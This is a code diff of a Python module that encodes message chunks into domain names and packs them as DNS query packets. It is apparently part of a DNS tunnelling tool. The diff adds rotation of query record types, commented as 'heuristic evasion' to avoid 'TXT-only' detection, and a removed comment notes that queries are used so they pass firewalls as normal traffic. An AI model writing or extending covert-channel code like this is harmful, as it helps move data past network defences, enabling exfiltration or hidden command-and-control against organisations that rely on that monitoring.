@@ -1,43 +1,44 @@
+import random
 from dnslib import DNSRecord, QTYPE, DNSHeader, DNSQuestion
 from message_fragmentation import fragment_message
 import cvc_codec 
-import random
+
+# QTYPE rotation for heuristic evasion
+# Mix of common record types to avoid "TXT-only" detection
+QTYPE_ROTATION = [QTYPE.A, QTYPE.AAAA, QTYPE.CNAME, QTYPE.TXT, QTYPE.MX]
 
 def dns_message(message, chunk_size):
     try:
-        # --- التعديل الضروري للحماية ---
-        # ضمان أن المدخلات هي بايتات دائماً قبل التقطيع
+        # Convert to bytes if needed
         if isinstance(message, str):
             message_bytes = message.encode('utf-8')
         elif isinstance(message, int):
-             # حماية إضافية في حال مررنا رقماً بالخطأ
             message_bytes = str(message).encode('utf-8')
         else:
-            # إذا كانت بايتات أصلاً (وهذا المتوقع من التشفير)، نتركها كما هي
             message_bytes = message
-        # -------------------------------
 
-        # 1. التقطيع (الآن نضمن أننا نمرر بايتات)
-        # message_bytes هنا هي البيانات الخام الصافية
-        chunks = fragment_message(message_bytes, chunk_size)
+        # 1. Fragment message - returns (session_id, chunks)
+        session_id, chunks = fragment_message(message_bytes, chunk_size)
+        
+        print(f"[BUILD DEBUG] fragment_message returned {len(chunks)} chunks, session={session_id}")
+        
         records = []
         
-        for chunk_bytes in chunks:
-            # 2. استدعاء خوارزمية CVC لتحويل البايتات لدومين
-            # chunk_bytes هنا هي (Binary Header + Partial Data)
+        for idx, chunk_bytes in enumerate(chunks):
+            # 2. CVC encode the chunk to domain name
             domain_name = cvc_codec.encode_packet_to_domain(chunk_bytes)
             
-            # 3. بناء الباكت
-            tid = random.randint(0, 65535)
+            # 3. Build DNS packet with session_id as Transaction ID
+            header = DNSHeader(id=session_id, qr=0, rd=1)
             
-            # QR=0 (Query) لضمان المرور عبر الفايروول وكأنها استعلامات طبيعية
-            header = DNSHeader(id=tid, qr=0, rd=1)
-            
-            q = DNSQuestion(domain_name, QTYPE.TXT)
+            # 4. QTYPE ROTATION - randomly select record type per packet
+            qtype = random.choice(QTYPE_ROTATION)
+            q = DNSQuestion(domain_name, qtype)
             
             dns_packet = DNSRecord(header=header, q=q).pack()
             records.append(dns_packet)
         
+        print(f"[BUILD DEBUG] dns_message returning {len(records)} DNS packets")
         return records
     except Exception as e:
         print(f"Error building DNS: {e}")
